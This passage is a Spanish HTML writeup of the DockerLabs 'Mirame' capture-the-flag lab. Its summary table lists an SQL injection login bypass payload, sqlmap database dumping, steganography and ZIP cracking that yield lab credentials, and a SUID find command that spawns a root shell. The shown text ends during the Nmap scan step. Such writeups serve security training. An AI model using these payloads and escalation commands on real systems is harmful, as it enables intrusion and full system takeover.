@@ -1,0 +1,1646 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mirame — DockerLabs Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Mirame de DockerLabs — Dificultad: Fácil. SQLi → sqlmap → Esteganografía → SSH → SUID find LPE.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,229,255,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--cyan); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-dl      { color: var(--cyan);  border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-sqli    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-steg    { color: var(--purple); border-color: rgba(191,95,255,0.35); background: rgba(191,95,255,0.05); }
+    .badge-suid    { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .sqli-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .sqli-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .sqli-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .sqli-box p strong { color: var(--red); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/dockerlabs/">dockerlabs</a> /
+      <span>mirame</span>
+    </p>
+    <h1 class="writeup-title"><span>Mirame</span></h1>
+    <p class="writeup-subtitle">DockerLabs — Linux · SQLi Bypass → sqlmap DB dump → Esteganografía → SSH → SUID find LPE</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-dl">DOCKERLABS</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-sqli">SQL INJECTION</span>
+      <span class="meta-badge badge-steg">ESTEGANOGRAFÍA</span>
+      <span class="meta-badge badge-suid">SUID · LPE</span>
+      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#despliegue">02 · Despliegue</a></li>
+        <li><a href="#reconocimiento">03 · Reconocimiento</a></li>
+        <li><a href="#enumeracion">04 · Enumeración Web</a></li>
+        <li><a href="#sqli">05 · SQL Injection</a></li>
+        <li><a href="#sqlmap">06 · sqlmap &amp; DB dump</a></li>
+        <li><a href="#esteganografia">07 · Esteganografía</a></li>
+        <li><a href="#acceso">08 · Acceso SSH</a></li>
+        <li><a href="#privesc">09 · Escalada · SUID find</a></li>
+        <li><a href="#referencia">10 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">11 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-cyan">DockerLabs</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Debian)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">DBMS</span><span class="info-val val-red">MariaDB (MySQL)</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>auto_deploy.sh</span> → máquina levantada</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puertos 22, 80</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Gobuster</span> → auth.php, page.php</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SQLi manual</span> → login no sanitizado</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Burp Suite</span> → captura request</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>sqlmap</span> → DB dump usuarios</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Gobuster + passwords</span> → directorio oculto</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>stegseek + john</span> → imagen cifrada</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH</span> → acceso como carlos</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">/usr/bin/find SUID</span> → ROOT</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Mirame</strong> es una máquina de dificultad <span class="hl">fácil</span>
+          de la plataforma <span class="hl-cyan">DockerLabs</span>, diseñada para practicar
+          <strong>bypass de autenticación mediante inyección SQL</strong>, extracción de datos
+          con <span class="hl">sqlmap</span>, técnicas de <span class="hl-pur">esteganografía</span>
+          y escalada de privilegios mediante un binario con el bit <span class="hl-red">SUID</span>
+          mal configurado. Corre sobre un contenedor Docker con <strong>Debian Linux</strong> y
+          expone dos servicios: <span class="hl-cyan">SSH (puerto 22)</span> con OpenSSH 9.2p1
+          y un servidor web <span class="hl-cyan">HTTP (puerto 80)</span> con Apache 2.4.61.
+        </p>
+        <p>
+          La superficie de ataque se inicia en un formulario de login web (
+          <span class="hl-cyan">index.php / auth.php</span>) que no sanitiza correctamente
+          las entradas del usuario, permitiendo inyecciones SQL básicas. A través de
+          <strong>sqlmap</strong> se extrae la base de datos completa con credenciales en
+          texto plano. Estas contraseñas se reutilizan como wordlist en un segundo
+          escaneo con <strong>Gobuster</strong>, descubriendo un directorio oculto que
+          contiene una imagen con datos esteganográficos — un fichero ZIP cifrado que,
+          al ser crackeado con <strong>John the Ripper</strong>, revela credenciales SSH.
+        </p>
+        <p>
+          Una vez dentro del sistema como el usuario <span class="hl">carlos</span>, la
+          escalada de privilegios es directa: el binario
+          <span class="hl-red">/usr/bin/find</span> tiene el bit <strong>SUID</strong>
+          activado, lo que permite ejecutarlo con permisos de root y lanzar una shell
+          privilegiada con una sola instrucción extraída de
+          <span class="hl-cyan">GTFOBins</span>.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Despliegue</td><td>sudo bash auto_deploy.sh mirame.tar</td><td>Contenedor activo · IP 172.17.0.2</td></tr>
+          <tr><td>Escaneo</td><td>nmap -p- -sSCV -n -Pn --min-rate=5000 -oX</td><td>Puertos 22 (SSH) y 80 (HTTP) abiertos</td></tr>
+          <tr><td>Reporte</td><td>xsltproc mirame.xml → mirame.html</td><td>Reporte HTML visual del scan Nmap</td></tr>
+          <tr><td>Enum. Web</td><td>gobuster dir -x txt,php,bak,old</td><td>Detectados auth.php, index.php, page.php</td></tr>
+          <tr><td>SQLi manual</td><td>'admin' --' en campo usuario</td><td>Error SQL visible → no sanitizado</td></tr>
+          <tr><td>Captura HTTP</td><td>Burp Suite Intercept → request.txt</td><td>POST /auth.php capturado</td></tr>
+          <tr><td>SQLi automático</td><td>sqlmap -r request.txt --dbs / --tables / --dump</td><td>4 usuarios con contraseñas en texto plano</td></tr>
+          <tr><td>Dir. oculto</td><td>gobuster con passwords como wordlist</td><td>Directorio /directoriotravieso descubierto</td></tr>
+          <tr><td>Esteganografía</td><td>stegseek miramebien.jpg</td><td>ocultito.zip embebido en imagen</td></tr>
+          <tr><td>Crack ZIP</td><td>zip2john + john --wordlist=rockyou.txt</td><td>Contraseña: stupid1</td></tr>
+          <tr><td>Extracción</td><td>unzip miramebien.jpg.out → secret.txt</td><td>Credenciales carlos:carlitos</td></tr>
+          <tr><td>Acceso inicial</td><td>ssh carlos@172.17.0.2</td><td>Shell como carlos</td></tr>
+          <tr><td>Recon local</td><td>find / -perm -4000 2>/dev/null</td><td>/usr/bin/find con bit SUID</td></tr>
+          <tr><td>Privesc</td><td>/usr/bin/find . -exec /bin/sh -p \; -quit</td><td>Shell como root</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- DESPLIEGUE -->
+    <div class="section" id="despliegue">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Despliegue de la Máquina</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">LEVANTAR EL CONTENEDOR DOCKER</span>
+      </div>
+      <div class="prose">
+        <p>
+          A diferencia de plataformas como HackTheBox donde las máquinas ya están corriendo en
+          servidores remotos, en <span class="hl-cyan">DockerLabs</span> las máquinas son
+          contenedores Docker que debemos levantar nosotros mismos en local. El proceso es simple:
+          se descarga el archivo <span class="hl-cyan">.tar</span> de la máquina y se ejecuta
+          el script <strong>auto_deploy.sh</strong> que viene incluido con la plataforma.
+        </p>
+        <p>
+          El script necesita permisos de superusuario (<span class="hl-cyan">sudo</span>) porque
+          Docker requiere privilegios elevados para crear y gestionar redes y contenedores. Internamente,
+          el script carga la imagen del contenedor desde el archivo .tar, crea una red Docker
+          interna, asigna automáticamente la IP <span class="hl">172.17.0.2</span> al contenedor
+          y lo inicia. Mientras el terminal muestre el mensaje de espera, la máquina está activa.
+          Al terminar, se presiona <span class="hl-cyan">Ctrl+C</span> para detener y eliminar el contenedor.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh mirame.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DEPLOY</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">mirame.tar</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div class="o-cyan">                    ##</div>
+        <div class="o-cyan">               ## ## ##        ==</div>
+        <div class="o-cyan">            ## ## ## ## ##    ===</div>
+        <div class="o-green">        /"""""""""""""""""\___/ ===</div>
+        <div class="o-green">   ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~</div>
+        <div class="o-green">        \______ o           __/</div>
+        <div class="o-green">          \    \         __/</div>
+        <div class="o-green">           \____\_______/</div>
+        <div>&nbsp;</div>
+        <div class="o-cyan">          D O C K E R L A B S</div>
+        <div>&nbsp;</div>
+        <div class="o-yellow">Estamos desplegando la máquina vulnerable, espere un momento.</div>
+        <div class="o-green">Máquina desplegada, su dirección IP es —&gt; <strong>172.17.0.2</strong></div>
+        <div class="o-red">Presiona Ctrl+C cuando termines con la máquina para eliminarla</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ 172.17.0.2?</p>
+        <p>Docker crea por defecto una red bridge interna con el rango <strong>172.17.0.0/16</strong>. El host (tu Kali) recibe la IP <strong>172.17.0.1</strong> (el gateway) y el primer contenedor que se levanta recibe <strong>172.17.0.2</strong>. A diferencia de HackTheBox donde necesitas VPN, en DockerLabs la comunicación es directa a través de esta red virtual local.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO COMPLETO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la máquina desplegada y su IP confirmada, el primer paso es descubrir qué servicios
+          están expuestos. Se realiza un escaneo completo de todos los
+          <strong>65,535 puertos TCP</strong> con Nmap, usando el siguiente conjunto de flags
+          optimizado para CTF:
+          <span class="hl-cyan">-p-</span> escanea la totalidad de puertos (sin esto, Nmap
+          solo comprueba los 1000 más comunes por defecto),
+          <span class="hl-cyan">-sSCV</span> combina tres modos en uno: SYN scan sigiloso que
+          no completa el handshake TCP, detección de versión de los servicios detectados, y
+          ejecución de los scripts de reconocimiento del engine NSE de Nmap.
+          <span class="hl-cyan">-n</span> desactiva la resolución de nombres DNS para no
+          añadir latencia innecesaria,
+          <span class="hl-cyan">-Pn</span> omite el ping de host-discovery (asume que el host
+          está activo — útil porque algunos hosts bloquean ICMP),
+          <span class="hl-cyan">--open</span> muestra únicamente los puertos que están abiertos,
+          y <span class="hl-cyan">--min-rate=5000</span> fuerza un mínimo de 5000 paquetes por
+          segundo para que el scan sea rápido. El resultado se exporta a XML con
+          <span class="hl-cyan">-oX mirame.xml</span> para procesarlo visualmente después.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX mirame.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
